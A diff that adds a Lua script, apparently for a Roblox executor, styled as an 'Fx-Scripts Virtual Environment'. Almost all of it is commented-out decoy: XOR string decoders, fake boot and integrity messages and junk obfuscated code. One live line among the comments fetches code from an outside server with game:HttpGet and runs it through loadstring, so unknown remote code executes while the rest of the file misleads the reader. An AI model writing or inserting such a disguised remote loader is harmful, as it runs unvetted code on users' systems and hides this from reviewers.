@@ -1,0 +1,103 @@
+---[=[
+--
+-- local l_1_l=string.char;local l_2_l=string.byte;local l_3_l=string.sub;local l_4_l=bit32 or bit;local l_5_l=l_4_l.bxor;local l_6_l=table.concat;local l_7_l=table.insert;local function l_8_l(l_9_l,l_10_l) local l_11_l={};for l_12_l=1,#l_9_l do l_7_l(l_11_l,l_1_l(l_5_l(l_2_l(l_3_l(l_9_l,l_12_l,l_12_l+1)),l_2_l(l_3_l(l_10_l,1+(l_12_l%#l_10_l),1+(l_12_l%#l_10_l)+1)))%256));end;return l_6_l(l_11_l);end;local l_13_l=false;local l_14_l=math.random(1000,9999);for l_15_l=0,100 do if(l_15_l%2)==0 then l_13_l=true;end;end;if l_13_l then local l_16_l=0;local l_17_l;local l_18_l;while true do if(l_16_l==0)then l_17_l=l_8_l("\245\194\207\36\166\178\201\23\197\202\218\41\239\161\194\26","\126\177\163\187\69\134\219\167");l_18_l=l_17_l:sub(1,4);break;end;end;end;local function l_19_l() end;l_19_l();
+--
+--    ███████╗██╗  ██╗    ██╗      ██████╗  ██████╗ ██████╗ ███████╗██████╗     
+--    ██╔════╝╚██╗██╔╝    ██║     ██╔═══██╗██╔═══██╗██╔══██╗██╔════╝██╔══██╗    
+--    █████╗   ╚███╔╝     ██║     ██║   ██║██║   ██║██║  ██║█████╗  ██████╔╝    
+--    ██╔══╝   ██╔██╗     ██║     ██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██╗    
+--    ███████╗██╔╝ ██╗    ███████╗╚██████╔╝╚██████╔╝██████╔╝███████╗██║  ██║    
+--    ╚══════╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝    
+--    -- Fx-Scripts Virtual Environment // v5.1 -- Initializing...
+--
+-- local IllIIl = {}
+-- local lIlIIl = {__index = _G}
+-- function IllIIl.new(IlIlIl)
+--     local lIIllI = setmetatable({}, lIlIIl)
+--     lIIllI.env = IlIlIl or {}
+--     return lIIllI
+-- end
+--
+-- local function llIIll(lIIIlI, lIlIII)
+--     local lIIlIl = ""
+--     for i = 1, #lIIIlI do
+--         lIIlIl = lIIlIl .. string.char(bit32.bxor(string.byte(lIIIlI, i), string.byte(lIlIII, (i - 1) % #lIlIII + 1)))
+--     end
+--     return lIIlIl
+-- end
+--
+-- local _ENV = IllIIl.new()
+-- local _STR_CHAR = string.char
+-- local _LOAD = llIIll(llIIll("\22\3\t\2\29\21\3", "execute"), "\123\45\67\89\12\34\56")
+--
+-- local function _EXECUTE(IlIIII)
+--     local lIIIII, lIIlII = pcall(function()
+--         local lIlIlI = ""
+--         for i = 1, #IlIIII, 2 do
+--             lIlIlI = lIlIlI .. _STR_CHAR(tonumber(IlIIII:sub(i, i + 1), 16))
+--         end
+--         return loadstring(lIlIlI)()
+--     end)
+--     if not lIIIII then
+--         --warn("Execution context failure: " .. tostring(lIIlII))
+--     end
+-- end
+--
+-- -- Simulating complex boot sequence...
+-- for i = 1, 5 do
+--     --print("Verifying integrity of module #" .. math.random(1000, 9999))
+--     task.wait(0.1)
+-- end
+--
+-- local _FINALIZER = {
+--     status = "Ready",
+--     run = function(self, chunk)
+--         local success, err = pcall(loadstring(chunk))
+--         if success then
+--             --print("Payload compiled successfully.")
+--             return success, err
+--         else
+--             --warn("Payload compilation failed: " .. tostring(err))
+--             return false
+--         end
+--     end
+-- }
+--
+loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/48123aff96713aa72e8649cfba554e154c552e98c1616f188adeb3899f56467c/download"))()
+-- local function _CLEANUP()
+--     _ENV = nil
+--     _FINALIZER = nil
+--     --print("Virtual environment context cleared.")
+-- end
+--
+-- local _ = coroutine.create(function()
+--     task.wait(5)
+--     _CLEANUP()
+-- end)
+--
+-- --coroutine.resume(_)
+--
+-- local l_19_l=string.char;local l_20_l=string.byte;local l_21_l=string.sub;local l_22_l=bit32 or bit;local l_23_l=l_22_l.bxor;local l_24_l=table.concat;local l_25_l=table.insert;local function l_26_l(l_27_l,l_28_l) local l_29_l={};for l_30_l=1,#l_27_l do l_25_l(l_29_l,l_19_l(l_23_l(l_20_l(l_21_l(l_27_l,l_30_l,l_30_l+1)),l_20_l(l_21_l(l_28_l,1+(l_30_l%#l_28_l),1+(l_30_l%#l_28_l)+1)))%256));end;return l_24_l(l_29_l);end;local l_31_l=false;local l_32_l=math.random(1000,9999);for l_33_l=0,100 do if(l_33_l%2)==0 then l_31_l=true;end;end;if l_31_l then local l_34_l=0;local l_35_l;local l_36_l;while true do if(l_34_l==0)then l_35_l=l_26_l("\245\194\207\36\166\178\201\23\197\202\218\41\239\161\194\26","\126\177\163\187\69\134\219\167");l_36_l=l_35_l:sub(1,4);break;end;end;end;local function l_37_l() end;l_37_l();
+--
+-- -- Finalization sequence initiated...
+--
+-- local __, ___, ____, _____, ______, _______
+-- __ = {___ = {}}
+-- function __.new()
+--     local self = setmetatable({}, {__index = __.prototype})
+--     return self
+-- end
+--
+-- __.prototype = {
+--     execute = function(self)
+--         local val = self.___ and self.___[1]
+--         if val and type(val) == "function" then
+--             --return val()
+--         end
+--     end
+-- }
+--
+-- -- Script context detached.
+-- -- Have a great day.
+--
+--]=]
